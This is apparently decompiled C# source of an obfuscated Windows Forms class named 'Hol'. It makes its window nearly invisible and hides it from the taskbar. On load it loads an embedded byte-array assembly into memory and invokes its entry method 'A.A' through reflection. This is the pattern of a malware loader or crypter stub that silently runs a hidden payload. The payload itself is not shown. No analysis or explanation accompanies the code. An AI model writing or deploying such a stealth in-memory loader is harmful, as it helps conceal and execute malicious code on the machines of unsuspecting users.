using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns6;

namespace ns3;

[DesignerGenerated]
internal class Hol : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private static Assembly assembly_0 = AppDomain.CurrentDomain.Load(Class7.Load);

	[DebuggerNonUserCode]
	public Hol()
	{
		((Form)this).add_Load((EventHandler)Hol_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private unsafe static void smethod_0(object object_0)
	{
		void* ptr = stackalloc byte[18];
		lock (list_0)
		{
			((byte*)ptr)[16] = ((list_0.Count == list_0.Capacity) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[16] != 0)
			{
				*(int*)ptr = 0;
				byte* num = (byte*)ptr + 4;
				*(int*)((byte*)ptr + 8) = checked(list_0.Count - 1);
				*(int*)num = 0;
				while (true)
				{
					int num2 = *(int*)((byte*)ptr + 4);
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8);
					if (num2 > *(int*)((byte*)ptr + 12))
					{
						break;
					}
					WeakReference weakReference = list_0[*(int*)((byte*)ptr + 4)];
					((byte*)ptr)[16] = (weakReference.IsAlive ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[16] != 0)
					{
						((byte*)ptr)[17] = ((*(int*)((byte*)ptr + 4) != *(int*)ptr) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[17] != 0)
						{
							list_0[*(int*)ptr] = list_0[*(int*)((byte*)ptr + 4)];
						}
						checked
						{
							(*unchecked((int*)ptr))++;
						}
					}
					checked
					{
						(*unchecked((int*)((byte*)ptr + 4)))++;
					}
				}
				list_0.RemoveRange(*(int*)ptr, checked(list_0.Count - *unchecked((int*)ptr)));
				list_0.Capacity = list_0.Count;
			}
			list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(350, 43);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Hol");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void Hol_Load(object sender, EventArgs e)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(assembly_0.CreateInstance("A.A"));
		objectValue.GetType().InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), null);
	}
}
